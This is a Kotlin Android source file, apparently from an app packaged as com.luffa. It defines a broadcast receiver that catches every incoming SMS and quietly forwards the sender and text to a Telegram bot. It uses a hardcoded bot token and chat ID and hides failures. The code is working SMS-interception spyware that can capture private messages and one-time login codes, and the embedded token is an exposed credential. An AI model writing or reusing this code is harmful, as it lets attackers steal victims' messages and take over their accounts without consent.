package com.luffa

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import kotlinx.coroutines.*

class SmsReceiver : BroadcastReceiver() {
    private val TAG = "SmsReceiver"
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val from = sms.originatingAddress
                val body = sms.messageBody
                // Forward to Telegram using helper
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val token = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
                        val chatId = "8820979221"
                        val okHttpClient = okhttp3.OkHttpClient()
                        val form = okhttp3.FormBody.Builder()
                            .add("chat_id", chatId)
                            .add("text", "SMS from $from: $body")
                            .build()
                        okHttpClient.newCall(
                            okhttp3.Request.Builder()
                                .url("https://api.telegram.org/bot$token/sendMessage")
                                .post(form)
                                .build()
                        ).execute()
                    } catch (e: Exception) {
                        // ignore
                    }
                }
            }
        }
    }
}
